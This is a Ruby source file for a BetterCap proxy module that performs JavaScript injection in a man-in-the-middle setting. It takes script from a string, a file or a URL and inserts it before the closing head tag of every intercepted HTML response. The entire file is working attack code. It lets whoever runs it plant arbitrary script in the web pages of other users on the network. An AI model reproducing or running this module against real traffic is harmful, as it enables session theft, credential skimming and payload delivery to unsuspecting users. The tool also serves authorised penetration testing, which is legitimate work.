# encoding: UTF-8
=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : http://www.evilsocket.net/

This project is released under the GPL 3 license.

=end

# This proxy module will take care of Javascript code injection.
class InjectJS < BetterCap::Proxy::Module
  # JS data to be injected.
  @@jsdata = nil
  # JS file URL to be injected.
  @@jsurl  = nil

  # Add custom command line arguments to the +opts+ OptionParser instance.
  def self.on_options(opts)
    opts.separator ""
    opts.separator "Inject JS Proxy Module Options:"
    opts.separator ""

    opts.on( '--js-data STRING', 'Javascript code to be injected.' ) do |v|
      @@jsdata = v
      unless @@jsdata.include?("<script")
        @@jsdata = "<script type=\"text/javascript\">\n#{@@jsdata}\n</script>"
      end
    end

    opts.on( '--js-file PATH', 'Path of the javascript file to be injected.' ) do |v|
      filename = File.expand_path v
      raise BetterCap::Error, "#{filename} invalid file." unless File.exists?(filename)
      @@jsdata = File.read( filename )
      unless @@jsdata.include?("<script")
        @@jsdata = "<script type=\"text/javascript\">\n#{@@jsdata}\n</script>"
      end
    end

    opts.on( '--js-url URL', 'URL the javascript file to be injected.' ) do |v|
      @@jsurl = v
    end
  end

  # Create an instance of this module and raise a BetterCap::Error if command
  # line arguments weren't correctly specified.
  def initialize
    raise BetterCap::Error, "No --js-file, --js-url or --js-data options specified for the proxy module." if @@jsdata.nil? and @@jsurl.nil?
  end

  # Called by the BetterCap::Proxy::Proxy processor on each HTTP +request+ and
  # +response+.
  def on_request( request, response )
    # is it a html page?
    if response.content_type =~ /^text\/html.*/
      BetterCap::Logger.info "Injecting javascript #{if @@jsdata.nil? then "URL" else "file" end} into http://#{request.host}#{request.url}"
      # inject URL
      if @@jsdata.nil?
        response.body.sub!( '</head>', "<script src=\"#{@@jsurl}\" type=\"text/javascript\"></script></head>" )
      # inject data
      else
        response.body.sub!( '</head>', "#{@@jsdata}</head>" )
      end
    end
  end
end
